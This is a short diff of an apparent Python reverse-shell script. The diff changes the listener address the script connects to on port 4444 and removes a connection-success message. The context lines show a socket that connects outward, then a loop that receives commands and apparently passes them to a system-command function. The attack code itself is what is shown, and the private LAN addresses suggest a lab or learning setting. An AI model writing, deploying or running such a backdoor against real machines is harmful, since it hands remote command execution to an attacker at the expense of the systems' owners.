@@ -11,9 +11,7 @@ def exe_sys_command(command):
 
 connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create socket object
 
-connection.connect(("192.168.1.247", 4444))  # specify IP and Port of the destination for the connection
-
-connection.send("\n[+] Creating connection was successful.\n")
+connection.connect(("192.168.1.113", 4444))  # specify IP and Port of the destination for the connection
 
 while True:
     command = connection.recv(1024)
